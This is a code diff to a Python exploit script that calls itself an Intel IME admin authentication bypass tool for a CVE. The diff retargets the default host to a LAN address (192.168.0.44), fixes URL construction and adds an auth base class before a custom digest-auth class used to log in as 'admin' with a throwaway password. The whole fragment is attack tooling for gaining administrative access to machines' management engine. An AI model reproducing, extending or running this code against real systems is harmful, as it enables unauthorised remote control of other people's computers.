@@ -90,7 +90,7 @@ parser = argparse.ArgumentParser(description='Intel IME Admin Bypass Tool, CVE-2
 parser.add_argument('--target',
                                  dest    = 'target',
                                  action  = "store" ,
-                                 default = '127.0.0.1' ,
+                                 default = "192.168.0.44" ,
                                  help    = "Intel IME Server To Target (http://192.168.0.1)" )
 parser.add_argument('--port',
                                  dest    = 'port',
@@ -108,7 +108,7 @@ arguments = parser.parse_args()
 #########################################
 # Stuff for the hack
 #########################################
-url                 = arguments.target + ":" + arguments.port
+url                 = "http://" + arguments.target + ":" + arguments.port
 ime_server_index    = url + "/index.html"
 ime_server_logon    = url + "/logon.html"
 options             = Options()
@@ -139,6 +139,12 @@ session             = browser.request_session
 index = requests.get(url, auth=HTTPDigestAuth('admin', 'Does_it_really_matter'))
 #the response SHOULD be the index_page
 
+
+class AuthBase(object):
+    """Base class that all auth implementations derive from"""
+
+    def __call__(self, r):
+        raise NotImplementedError('Auth hooks must be callable.')
 
 class HTTPDigestAuth(AuthBase):
     """Attaches HTTP Digest Authentication to the given Request object."""
